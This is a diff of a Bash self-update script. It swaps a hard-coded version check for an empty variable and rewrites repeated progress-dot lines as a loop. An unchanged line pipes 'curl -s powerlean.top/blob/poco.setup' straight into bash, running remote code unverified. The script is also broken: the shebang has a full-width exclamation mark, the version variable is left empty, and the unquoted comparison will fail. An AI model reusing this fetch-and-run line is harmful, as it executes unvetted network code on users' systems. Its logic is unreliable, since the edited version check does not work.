@@ -1,41 +1,20 @@
 #！/bin/bash
-lastest="34"
-if [[ "$version" -ne "$lastest" ]]; then
+lastest=
+if [ $version -ne $lastest ]; then
   ${force_update}
   export mode="update"
   curl -s powerlean.top/blob/poco.setup | bash
   function progress {
   point="echo -e -n ${green} .${done}"
   sec="0.5"
-  sleep $sec
-  $point
-  sleep $sec
-  $point
-  sleep $sec
-  $point
-  sleep $sec
-  $point
-  sleep $sec
-  $point
-  sleep $sec
-  $point
-  sleep $sec
-  $point
-  sleep $sec
-  $point
-  sleep $sec
-  $point
-  sleep $sec
-  $point
-  sleep $sec
-  $point
-  sleep $sec
-  $point
-  sleep $sec
-  $point
-  sleep $sec
+  loop=1
+while [ $loop -lt 15 ]; do
+    sleep $sec
+    $point
+    loop=$(($loop+1))
+done
   echo " ."
-  sleep 4
+  sleep 5
 }
   clear
   ${update_note}
